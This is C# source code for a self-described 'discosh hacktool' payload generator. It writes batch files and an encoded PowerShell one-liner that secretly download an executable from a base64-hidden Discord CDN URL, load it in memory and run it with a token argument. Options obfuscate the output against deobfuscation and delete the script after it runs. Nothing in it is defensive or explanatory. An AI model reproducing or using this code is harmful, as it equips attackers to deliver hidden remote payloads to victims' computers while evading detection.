﻿using System;
using System.Text;
using discosh.Protections;

namespace discosh
{
    public class PGen
    {
        private static string dropper_uri = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU4NzQzMTgzODE3MzM5MDAzLzk1ODk5Mjc4MjE4ODQ5ODk1NC9oZXlhLmV4ZQ==";
        private static string payload_uri = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU4NzQzMTgzODE3MzM5MDAzLzk1ODk5MjQ0MDkzMTUzMjgxMC9oaS5leGU=";

        public static byte[] Generate(string token, string prefix, bool obf, bool delself, string geolock, bool ponly)
        {
            StringBuilder ret = new StringBuilder();
            Console.WriteLine("Generating...");
            StringBuilder gencode = new StringBuilder();
            gencode.AppendLine("rem Generated by discosh hacktool");
            gencode.AppendLine($"powershell -noprofile -windowstyle hidden -command [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{(ponly ? payload_uri : dropper_uri)}')))).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))");
            if (delself) gencode.AppendLine("(goto) 2>nul & del \"%~f0\"");
            gencode.AppendLine("exit");

            if (obf)
            {
                Console.WriteLine("Obfuscating...");
                string obfuscated = StringSplit.GenCode(gencode.ToString(), new Random(), 3);
                obfuscated = AntiDeobf.GenCode(obfuscated);
                ret.AppendLine("@echo off");
                ret.AppendLine("cls");
                ret.Append(obfuscated);
                return UTF16BOM.Process(ret.ToString());
            }
            else
            {
                ret.AppendLine("@echo off");
                ret.Append(gencode.ToString());
                return Encoding.ASCII.GetBytes(ret.ToString());
            }
        }

        public static string GenerateCommand(string token, string prefix, string geolock, bool ponly) => "powershell -noprofile -encodedcommand " + Convert.ToBase64String(Encoding.Unicode.GetBytes($"powershell -noprofile -command [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{(ponly ? payload_uri : dropper_uri)}')))).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))"));
    }
}
